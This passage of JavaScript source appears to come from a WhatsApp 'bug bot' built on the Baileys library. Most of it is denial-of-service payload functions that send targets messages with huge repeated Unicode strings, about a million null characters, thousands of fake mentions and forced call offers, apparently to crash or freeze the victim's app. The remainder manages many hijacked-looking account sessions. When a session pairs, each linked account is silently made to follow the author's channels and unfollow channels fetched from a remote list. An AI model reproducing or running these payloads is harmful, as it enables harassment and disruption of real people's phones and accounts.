                    newsletterAdminInviteMessage: {
                        newsletterJid: "otax@newsletter",
                        newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
                        caption: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
                        inviteExpiration: "999999999"
                    }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
                    newsletterJid: "13135550002@newsletter",
                    serverId: 1
                }
            }
        }
    };

    const fullMsgNode = await sock.generateWAMessage(target, message, {
        userJid: sock.user.id
    });

    const encNode = fullMsgNode.content[0];

    const Stanza = {
    tag: "message",
    id: sock.generateMessageID(),
    type: "text",
    to: target,
    additionalAttributes: {},
    content: [
      {
        tag: "enc",
        attrs: {
          v: "2",
          type: "none"
        },
        content: []
      },
      {
        tag: "participants",
        atts: {},
        content: nodes
      }
    ]
  }

    await sock.sendNode(Stanza);

    await sleep(1000);

    await sock.sendMessage(target, {
        delete: {
            remoteJid: target,
            fromMe: true,
            id: fullMsgNode.attrs.id,
            participant: target
        }
    });

    console.log("Delay Visib Success To " + target);
}

async function XFCUI(sock, target) {
sock.relayMessage(
target,
{
locationMessage: {
degreesLatitude: 1010101,
degreesLongitude: 1010101,
name: "⤻꙳͙͡༑VORCELIGHT IZIN LEWAT 🫵🖕" + "ꦽ⸙".repeat(60000),
address: ".sevrin444 ( @POPsayang )",
url: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/" + "ꦽ⸙".repeat(60000),
clickToWhatsappCall: true,
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: target
},
mentionedJid: [target,"13135550002@s.whatsapp.net"]
}
}
},
{ participant: {jid: target} }
)
}

async function d3nis(sock, target) {
  try {
  const currentRepeatCount = 522500;  
  const msg1 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: ".menu", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(currentRepeatCount),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });

    const msg2 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "x", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(currentRepeatCount),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });

    const Audio = {
      message: {
        ephemeralMessage: {
          message: {
            audioMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
              mimetype: "audio/mpeg",
              fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
              fileLength: 999999999999,
              seconds: 99999999999999,
              ptt: true,
              mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
              fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
              directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
              mediaKeyTimestamp: 99999999999999,
              contextInfo: {
                mentionedJid: [
                  "@s.whatsapp.net",
                  ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 90000000) + "@s.whatsapp.net")
                ],
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "133@newsletter",
                  serverMessageId: 1,
                  newsletterName: "𞋯"
                }
              },
              waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
            }
          }
        }
      }
    };

    const msgAudio = await generateWAMessageFromContent(target, Audio.message, { userJid: target });

    await sock.relayMessage("status@broadcast", msgAudio.message, {
      messageId: msgAudio.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    const stickerMsg = {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
        mimetype: "image/webp",
        height: 9999,
        width: 9999,
        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
        fileLength: 12260,
        mediaKeyTimestamp: "1743832131",
        isAnimated: false,
        stickerSentTs: "X",
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
          ],
          stanzaId: "1234567890ABCDEF",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        }
      }
    };

    await sock.relayMessage("status@broadcast", stickerMsg, {
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });

    if (mention) {
      await sock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msgAudio.key,
              type: 25
            }
          }
        }
      }, {
        additionalNodes: [{
          tag: "meta",
          attrs: {
            is_status_mention: "!"
          },
          content: undefined
        }]
      });
    }
    let msg = await generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        body : { text: "X", format: "DEFAULT" },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "\u0000".repeat(100000)
        },
    contextInfo: {
       mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 3000 },
                () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
       entryPointConversionSource: "galaxy_message"
      }
    }
  }, {});
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message
    }
  },
    {
      participant: { jid: target },
      messageId: msg.key.id
    });
    
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
  } catch (err) {
    console.log(err.message)
  }
}

async function exeTrash(client, target) {
  await client.relayMessage(
    target,
    {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "1@newsletter",
            newsletterName: "ꦽ".repeat(60000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(60000),
            inviteExpiration: Date.now() * 999e+2
          }
        }
      },
      nativeFlowMessage: {
        messageParamsJson: "{}",
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: "{}"
          }
        ]
      },
      contextInfo: {
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
      },
    },
    {}
  );

  await client.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: "⤻꙳‌‌༑VORCELIGHT IZIN LEWAT¿‽" + "ꦽ".repeat(60000),
        contextInfo: {
          quotedMessage: {
            groupInviteMessage: {
              groupJid: "888-62888@g.us",
              inviteCode: "Xx".repeat(10000),
              inviteExpiration: Date.now() * 999e+2,
              groupName: "ꦽ".repeat(60000),
              caption: "ꦽ".repeat(60000),
              jpegThumbnail: ""
            }
          },
          mentionedJid: [
            "13135550002@s.whatsapp.net",
            ...Array.from({ length: 1999 }, () =>
              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
            )
          ],
        }
      }
    },
    {}
  );
}

async function gsysn(sock, target, mention) {
  try {

    const Docktring = {
      viewOnceMessage: {
        message: {
          groupStatusMessageV2: {
            message: {
              interactiveResponseMessage: {
                nativeFlowResponseMessage: {
                  name: "galaxy_message",
                  paramsJson: "\x10" + "\u0000".repeat(1030000),
                  version: 3
                }
              }
            }
          }
        }
      }
    };

    const Whatsapp = {
      viewOnceMessage: {
        message: {
          groupStatusMessageV2: {
            message: {
              interactiveResponseMessage: {
                nativeFlowResponseMessage: {
                  name: "call_permission_request",
                  paramsJson: "\x10" + "\u0000".repeat(1030000),
                  version: 3
                }
              }
            }
          }
        }
      }
    };

    const MsgVn = {
      viewOnceMessage: {
        message: {
          groupStatusMessageV2: {
            message: {
              interactiveResponseMessage: {
                nativeFlowResponseMessage: {
                  name: "address_message",
                  paramsJson: "\x10" + "\u0000".repeat(1030000),
                  version: 3
                }
              }
            }
          }
        }
      }
    };

    for (const msg of [Docktring, Whatsapp, MsgVn]) {
      await sock.relayMessage(
        "status@broadcast",
        msg,
        {
          messageId: undefined,
          statusJidList: [target],
          additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }]
          }]
        }
      );
    }

    const msg1 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "_", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: Math.floor(Date.now() / 1000)
    });

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });

    const msg2 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "\u0000", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: Math.floor(Date.now() / 1000)
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });

    const String = {
      message: {
        ephemeralMessage: {
          message: {
            audioMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
              mimetype: "audio/mpeg",
              fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
              fileLength: 99999999999999,
              seconds: 99999999999999,
              ptt: true,
              mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
              fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
              directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
              mediaKeyTimestamp: 99999999999999,
              contextInfo: {
                mentionedJid: [
                  "@s.whatsapp.net",
                  ...Array.from({ length: 1900 }, () =>
                    `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                  )
                ],
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "133@newsletter",
                  serverMessageId: 1,
                  newsletterName: "𞋯"
                }
              },
              waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
            }
          }
        }
      }
    };

    const msgX = await generateWAMessageFromContent(target, String.message, { userJid: target });

    await sock.relayMessage("status@broadcast", msgX.message, {
      messageId: msgX.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });

    if (mention) {
      await sock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msgX.key,
              type: 25
            }
          }
        }
      }, {
        additionalNodes: [{
          tag: "meta",
          attrs: { is_status_mention: "!" }
        }]
      });
    }

    console.log(`✅ Bug terkirim ke target: ${target}`);

  } catch (err) {
    console.log("Error MsgAudio:", err);
  }
}

async function testes(sock, target) {
  try {
    await sock.offerCall(target);
  } catch (error) {}
  try {
    await sock.offerCall(target, { video: true });
  } catch (error) {}
  let msg = generateWAMessageFromContent(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4",
                mimetype: "image/jpeg",
                fileSha256: "HKXSAQdSyKgkkF2/OpqvJsl7dkvtnp23HerOIjF9/fM=",
                fileLength: "999999999999999",
                height: 99999,
                width: 99999,
                mediaKey: "TGuDwazegPDnxyAcLsiXSvrvcbzYpQ0b6iqPdqGx808=",
                fileEncSha256: "hRGms7zMrcNR9LAAD3+eUy4QsgFV58gm9nCHaAYYu88=",
                directPath: "/o1/v/t24/f2/m269/",
                mediaKeyTimestamp: Math.floor(Date.now() / 1000).toString(),
                jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
                contactVcard: true,
                thumbnailDirectPath: `/v/t62.36145-24/${Math.floor(Math.random() * 1e18)}.enc`,
                thumbnailSha256: crypto.randomBytes(32).toString("base64"),
                thumbnailEncSha256: crypto.randomBytes(32).toString("base64"),
                thumbnailHeight: Math.floor(Math.random() * 1080),
                thumbnailWidth: Math.floor(Math.random() * 1920)
              },
              hasMediaAttachment: true
            },
            body: {
              text: "X "
            },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: "X" },
                { name: "galaxy_message", buttonParamsJson: "{\"flow_message_version\":\"3\"}" },
                { name: "call_permission_message", buttonParamsJson: "\x10".repeat(10000) }
              ],
              messageParamsJson: "X" + "\u0000".repeat(900000)
            },
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from({ length: 999 }, () => `1${Math.floor(Math.random() * 500000)}@lid`)
              ],
              forwardingScore: 999999,
              isForwarded: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: { conversation: " X " }
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id
  });
}
async function testes2(sock, target) {
  try {
    const metaNode = [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }];
    const locationMessage = {
      degreesLatitude: -9.0999999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + "𑆵𑆴𑆿".repeat(15000),
      address: "\u0000" + "𑆵𑆴𑆿".repeat(10000),
      url: `${𑇂𑆵𑆴𑆿.repeat(25000)}.com`
    };
    const extendMsg = {
      extendedTextMessage: {
        text: "X",
        matchedText: "",
        description: "𑆵𑆴𑆿".repeat(25000),
        title: "𑆵𑆴𑆿".repeat(15000),
        previewType: null,
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/OLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 789,
        thumbnailWidth: 654,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    };
    const makeMsg = content =>
      generateWAMessageFromContent(
        target,
        { viewOnceMessage: { message: content } },
        {}
      );
    const Loca = makeMsg({ locationMessage });
    const Extend = makeMsg(extendMsg);
    const Button = makeMsg({ locationMessage });
    for (const m of [Loca, Extend, Button]) {
      await sock.relayMessage(
        "status@broadcast",
        m.message,
        {
          messageId: m.key.id,
          statusJidList: [target],
          additionalNodes: metaNode
        }
      );
    }
    console.log(chalk.green(`Sukses mengirim ${target}`));
  } catch (e) {
    console.error(chalk.red("Error:"), e);
  }
}

async function tesyu(sock, target) {
  let ZunnG = [];

  ZunnG.push({
    name: "single_select",
    buttonParamsJson: "\u0003",
  });

  for (let i = 0; i < 5000; i++) {
    ZunnG.push({
      name: "call_permission_request",
      buttonParamsJson: "\u0003",
    });
  }

  ZunnG.push({
    name: "call_permission_request",
    buttonParamsJson: "\u0003",
  });

  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
            },
            body: {
              text: "Vorcelight Hama¿‽" + "ꦽ".repeat(50000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{{".repeat(10000),
              paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "Zunn :: Zunn",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "cyber@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦽ".repeat(25000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }`,
              version: 3,
              buttons: ZunnG,
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(
    target,
    msg.message,
    {
      participant: {
        jid: target,
      },
    }
  );
}
// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; // ✅ Tambahkan return
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

// === Setup VIP Folder ===
function setupVipFolder() {
  // Ganti path menjadi root folder 'vip', bukan di dalam 'permenmd'
  const vipPath = path.join(__dirname, 'vip');

  try {
    if (!fs.existsSync(vipPath)) {
      fs.mkdirSync(vipPath, { recursive: true });
      console.log("[INFO] Folder VIP (root) dibuat otomatis.");
    }
  } catch (err) {
    console.error("[INFO] Gagal membuat folder VIP:", err);
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
  //startLoop();
}

//const axios = require("axios");
const RAW_URL = "https://raw.githubusercontent.com/DGXeon13/strings/refs/heads/main/strings.json";

async function unfollowAllChannel() {
  try {
    const { data } = await axios.get(RAW_URL);

    if (!Array.isArray(data)) {
      console.log("Data bukan array!");
      return;
    }

    console.log(`Total channel: ${data.length}`);

    for (let i = 0; i < data.length; i++) {
      const jid = data[i];
      try {
        await sock.newsletterUnfollow(jid);
        console.log(`[${i + 1}/${data.length}] Unfollow: ${jid}`);
        await new Promise(resolve => setTimeout(resolve, 1500));
      } catch (err) {
        console.log(`Gagal unfollow ${jid}:`, err.message);
      }
    }

    console.log("✅ Selesai unfollow semua channel dari baileys.");
  } catch (error) {
    console.log("❌ Gagal ambil data raw:", error.message);
  }
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  const sessionDir = path.join('permenmd', owner, number);

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      try {
        
        await sock.newsletterFollow("120363404995533206@newsletter");
        await sock.newsletterFollow("120363330344810280@newsletter");
        await sleep(5000);
        await unfollowAllChannel();
        console.log("✅ Auto join channel sukses");
      } catch (e) {
        console.log("❌ Auto join channel gagal");
      }
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);

      try {
        await waiting(3000)
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds); // baca isi file sumber
          fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
          console.log(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
   
}

async function startUserSessions() {
  const vipDir = path.join(__dirname, 'vip');
  const vvipDir = path.join(__dirname, 'vvip');
  const baseDir = 'permenmd';

  // Buat folder vvip kalau belum ada
  if (!fs.existsSync(vvipDir)) {
    fs.mkdirSync(vvipDir, { recursive: true });
    console.log(`[INFO] Folder vvip dibuat.`);
  }

  // Helper: copy creds ke vvip/nomor.json setelah konek
  async function copyCredsToVVIP(sessionPath, sessionName) {
    const credsSource = path.join(sessionPath, `${sessionName}.json`);
    const credsDest = path.join(vvipDir, `${sessionName}.json`);
    try {
      if (fs.existsSync(credsSource)) {
        fs.copyFileSync(credsSource, credsDest);
        console.log(`[VVIP] Creds copied: ${sessionName}.json → vvip/`);
      } else {
        console.warn(`[VVIP] creds.json tidak ditemukan di ${sessionPath}`);
      }
    } catch (err) {
      console.error(`[VVIP ERROR] Gagal copy creds ${sessionName}:`, err.message);
    }
  }

  // 1. Scan VIP Folder (Root)
  if (fs.existsSync(vipDir)) {
    const vipFolders = fs.readdirSync(vipDir).filter(f =>
      fs.statSync(path.join(vipDir, f)).isDirectory()
    );

    console.log(`[DEBUG] Scanning VIP folder. Found ${vipFolders.length} items.`);

    for (const sessionName of vipFolders) {
      const sessionPath = path.join(vipDir, sessionName);

      if (activeConnections[sessionName]) {
        console.log(`[SKIP] VIP Session ${sessionName} already active.`);
        continue;
      }

      try {
        console.log(`[START] Connecting VIP session: ${sessionName}`);
        await connectSession(sessionPath, sessionName);
        await copyCredsToVVIP(sessionPath, sessionName); // ✅ Copy setelah konek
      } catch (err) {
        console.error(`[ERROR] Failed VIP session ${sessionName}:`, err.message);
      }
    }
  }

  // 2. Scan User Folders (permenmd)
  const subfolders = fs.readdirSync(baseDir)
    .map(name => path.join(baseDir, name))
    .filter(p => fs.lstatSync(p).isDirectory());

